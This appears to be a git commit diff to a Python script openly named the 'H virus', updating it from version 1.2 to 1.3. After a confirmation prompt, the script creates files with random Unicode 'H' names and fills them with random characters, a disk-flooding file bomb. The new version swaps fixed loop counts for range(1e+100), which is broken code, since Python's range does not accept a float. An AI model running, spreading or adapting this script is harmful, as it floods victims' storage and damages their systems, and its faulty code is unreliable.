f544a9e944705570be73eb32abf28e14b14077a8
Sokopy <gabrojaslopez@gmail.com>
2022-12-16 12:15:38 -0600

    :3

--- h.py
+++ h.py
@@ -1,7 +1,7 @@
 import os, sys, time, random
-os.system("color 1 & title H virus [version 1.2] & cls")
+os.system("color 1 & title H virus [version 1.3] & cls")
 l = list("ħhɦɥʜĥḧḩȟɧʮʯℋℌℍℎℏ♄♅🄗🄷🅷Ⓗ🅗🇭ĦHꞪꞍʜĤḦḨȞ")
-print(">>>>>>>>>>>>>>>> The H virus (version 1.2) <<<<<<<<<<<<<<<<\n")
+print(">>>>>>>>>>>>>>>> The H virus (version 1.3) <<<<<<<<<<<<<<<<\n")
 while True:
     confirm = input("Do you want to execute the H virus? I am not responsible for software damage or other consequences\n(y/n) ")
     if confirm == "n":
@@ -16,13 +16,13 @@ while True:
         os.system("cls")
 text = ""
 title = ""
-for i in range(65000):
-    for i in range(65000):
-        for i in range(200):
-            title += l[random.randint(0, len(l)-1)]
-        with open(title, "a", encoding="utf-8") as file:
-            for i in range(65000):
-                text += l[random.randint(0, len(l)-1)]
-            file.write(text)
-            text = ""
-            title = ""
+
+for i in range(1e+100):
+    for i in range(200):
+        title += l[random.randint(0, len(l)-1)]
+    with open(title, "a", encoding="utf-8") as file:
+        for i in range(1e+100):
+            text += l[random.randint(0, len(l)-1)]
+        file.write(text)
+        text = ""
+        title = ""
